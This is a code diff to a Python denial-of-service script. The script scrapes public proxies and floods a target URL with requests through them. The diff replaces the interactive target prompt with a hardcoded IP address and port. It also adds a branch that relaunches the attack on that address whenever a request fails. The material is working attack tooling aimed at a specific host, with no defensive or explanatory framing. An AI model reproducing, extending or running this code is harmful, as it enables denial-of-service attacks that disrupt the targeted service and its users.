@@ -71,6 +71,8 @@ def start_ddos(prox, url, headers, proxies, color):
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+"{} send requests...".format(prox))
+		else:
+			main("all", "https://207.244.243.149:8085")		
 	except:
 		pass
 
@@ -80,15 +82,9 @@ def start_ddos(prox, url, headers, proxies, color):
 def main(proxy, url):
 	clear()
 	logo()
-	if url == None:
-		print(bcolors.LITBU + "Enter the full URL example: https://google.com\nEnter a country to serach proxy example: EN, RU, UA, or: all")
-		url = input(bcolors.LITBU + "URL site: ")
-		country = input(bcolors.LITBU + "Proxy country: ")
-		if country == None:
-			country = "all"
-	if url[:4] != "http":
-		print(Fore.RED+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
-		exit()
+	url = "https://207.244.243.149:8085"
+	country = "all"
+
 	if proxy == None:
 		while True:
 			req = r.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
